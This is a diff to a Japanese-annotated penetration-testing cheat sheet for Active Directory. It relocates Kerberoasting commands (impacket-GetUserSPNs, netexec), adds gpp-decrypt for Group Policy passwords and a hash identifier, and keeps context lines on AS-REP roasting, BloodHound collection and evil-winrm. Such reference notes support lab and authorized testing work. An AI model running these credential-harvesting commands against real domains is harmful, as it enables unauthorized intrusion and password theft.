@@ -10,6 +10,8 @@
 # userenum & asreproast
 impacket-GetNPUsers -outputfile 'OUTPUT.txt' -ts -dc-ip 'IP' -usersfile 'USERLIST' 'DOMAINNAME'
 impacket-GetNPUsers -outputfile 'OUTPUT.txt' -ts -dc-ip 'IP' -no-pass 'DOMAINNAME/USERNAME'
+# kerberoasting (TCP389番も必要)
+impacket-GetUserSPNs -outputfile 'OUTPUT.txt' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
 ```
 ### kerbrute
 ```sh
@@ -21,6 +23,8 @@ impacket-GetNPUsers -outputfile 'OUTPUT.txt' -ts -dc-ip 'IP' -no-pass 'DOMAINNAM
 # ASREPRoast (TCP389番も必要)
 netexec ldap 'IP' -u 'USERNAMELIST' -p '' --asreproast 'OUTPUT.txt'
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --asreproast 'OUTPUT.txt'
+# Kerberoasting (TCP389番も必要)
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdcHost 'IP' --kerberoasting 'OUTPUT.txt'
 ```
 
 
@@ -50,8 +54,6 @@ netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --active-users
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --groups
 # Find Domain SID
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --get-sid
-# Kerberoasting (TCP88番も必要)
-netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdcHost 'IP' --kerberoasting 'OUTPUT.txt'
 # Admin Count
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --admin-count
 # Machine Account Quota
@@ -64,11 +66,6 @@ https://www.netexec.wiki/ldap-protocol/read-dacl-right
 netexec ldap 'IP' --dns-server 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodhound --collection All
 # List DC IP / Enum Trust
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --dc-list
-```
-### impacket
-```sh
-# kerberoasting (TCP88番も必要)
-impacket-GetUserSPNs -outputfile 'OUTPUT.txt' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
 ```
 
 
@@ -163,12 +160,21 @@ evil-winrm -i 'IP' -u 'USERNAME' -p 'PASSWORD'
 
 
 ## kali
+### gpp-decrypt
+```sh
+ gpp-decrypt "Groups.xmlのcpassword"
+```
 ### impacket-smbserver
 ```sh
 impacket-smbserver 'SHARENAME' 'PATH'
 # smbv1が無効の場合は
 impacket-smbserver -smb2support 'SHARENAME' 'PATH'
 ```
+### name-that-hash
+```sh
+name-that-hash -f 'hash.txt' --no-banner --no-john
+```
+
 
 
 ## link
